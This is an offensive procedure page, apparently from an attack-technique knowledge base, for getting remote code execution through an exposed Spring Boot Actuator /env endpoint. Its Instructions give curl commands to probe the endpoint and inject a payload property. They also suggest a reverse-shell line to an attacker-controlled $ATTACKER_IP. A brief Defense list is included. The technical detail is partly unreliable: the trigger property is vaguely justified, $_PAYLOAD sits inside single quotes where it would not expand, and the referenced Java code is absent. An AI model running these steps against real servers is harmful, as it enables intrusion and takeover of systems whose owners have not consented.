---
type: procedure
description: >-
  Exploit the Spring Boot Actuator /env endpoint to achieve remote code
  execution by injecting a malicious ScriptEngineFactory.
verified: true
submitted: false
created_at: '2023-04-06T03:55:59.691691+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/Insecure Management Interface]]'
  - '[[tags/Remote Code Execution via `/env`]]'
  - '[[tags/Springboot-Actuator]]'
  - '[[tags/Steps]]'
commands:
  - '[[commands/curl-get-spring-boot-actuator-env]]'
  - '[[commands/curl-post-spring-boot-actuator-rce-payload]]'
platforms:
  - Web
  - Java
tools: []
validated: true
---

# Spring-Boot-Actuator-RCE-via-Env-Endpoint

## Summary

This procedure exploits a vulnerability in the Spring Boot Actuator /env endpoint, where an insecure management interface allows attackers to inject a malicious value for an environment variable. The payload uses a custom ScriptEngineFactory that executes arbitrary code via Java's Runtime.exec() when loaded or accessed through the endpoint, leading to remote code execution on the target application server.

## Description

Spring Boot Actuator provides production-ready features for monitoring and managing applications, including the /env endpoint which exposes current environment properties. If this endpoint is exposed without proper authentication or access controls (Insecure Management Interface), an attacker can POST malicious data to set environment variables. By crafting a payload that defines or references a malicious ScriptEngineFactory, the application may load and instantiate it during property resolution or endpoint access, triggering code execution. This can result in full compromise of the application server, enabling data exfiltration, persistence, or further lateral movement. The target environment is typically a Java-based web application running Spring Boot with Actuator enabled and /env unsecured. Success depends on the application's configuration allowing dynamic class loading or script engine resolution from environment properties.

## Requirements

1. Network access to the target application's Actuator endpoints (usually port 8080 or configured management port).
2. The /actuator/env endpoint must be enabled and accessible without authentication.
3. Basic knowledge of the target URL and Java command execution for payload customization.
4. Tools like curl for HTTP requests (standard on most systems).

## Defense

1. Ensure that the application is not vulnerable to Insecure Management Interface by following secure coding practices and regular security assessments.
2. Implement network segmentation and access controls to limit access to the application and underlying infrastructure.
3. Monitor network traffic and system logs for any suspicious activity.
4. Disable or secure Actuator endpoints by setting management.endpoints.web.exposure.include to exclude /env, or require authentication via Spring Security.
5. Use allowlisting for environment properties and avoid dynamic loading of ScriptEngineFactories.

## Objectives

1. Execute arbitrary code on the target system.
2. Compromise the target application and underlying infrastructure.
3. Verify execution through observable effects like network connections or file creation.

## Instructions

### Step 1: Verify /actuator/env Endpoint Accessibility

**Context**: Before attempting exploitation, confirm that the /env endpoint is exposed and returns environment properties without requiring authentication. This step identifies if the insecure configuration exists.

**Command** ([[commands/curl-get-spring-boot-actuator-env]]):
```bash
curl -X GET $_TARGET_URL/actuator/env
```

> This sends a GET request to retrieve the current environment properties. If successful, it confirms the endpoint is vulnerable to further manipulation. If it returns 401/403, authentication is required, and this procedure may not apply without credentials.

Expected Output: A JSON response containing property sources, such as:

```json
{
  "propertySources": [
    {
      "name": "systemProperties",
      "properties": {
        "java.version": {
          "value": "11.0.1"
        }
      }
    }
  ]
}
```

Success Criteria: HTTP 200 status and JSON output without errors; presence of sensitive properties indicates high risk.

### Step 2: Prepare the Malicious ScriptEngineFactory Payload

**Context**: Create or customize the Java code for the malicious ScriptEngineFactory, which will execute the desired command when instantiated. This factory is loaded via environment properties during endpoint access.

**Code Reference** ([[codes/Java-AwesomeScriptEngineFactory-RCE]]):

> Use the provided code snippet. Replace the placeholder command in the Runtime.exec() call (e.g., "ping rce.poc.attacker.example") with your target command, such as a reverse shell ("bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'") or file write ("touch /tmp/rce_success"). Compile the class if dynamic loading requires a .class file (javac AwesomeScriptEngineFactory.java), or prepare it as a string for injection if the vulnerability supports source-based loading.

Expected Output: A customized .java or .class file ready for payload delivery.

Success Criteria: Code compiles without errors (if applicable) and the command placeholder is replaced with a valid executable string.

### Step 3: Inject the Malicious Environment Variable

**Context**: POST a new environment variable to the /env endpoint with a value that triggers loading of the malicious ScriptEngineFactory, causing code execution upon access or resolution.

**Command** ([[commands/curl-post-spring-boot-actuator-rce-payload]]):
```bash
curl -X POST $_TARGET_URL/actuator/env \
  -H "Content-Type: application/json" \
  -d '{"name":"script.engine.factory","value":"$_PAYLOAD"}'
```

> This sets an environment variable named "script.engine.factory" (or a application-specific property that triggers ScriptEngine loading) to the malicious payload value. $_PAYLOAD should be the class name, base64-encoded source, or direct reference to the factory (e.g., the compiled class path or dynamic load string). After posting, access /env again to trigger execution if needed. Monitor for command effects on the target.

Expected Output: HTTP 200 response confirming the property update, such as {"name":"script.engine.factory","value":"..."}. Evidence of execution may include network pings, new files, or process logs on the target.

Success Criteria: Property set successfully; observable side effects from the executed command (e.g., incoming connection on listener port or file creation verified via other means).
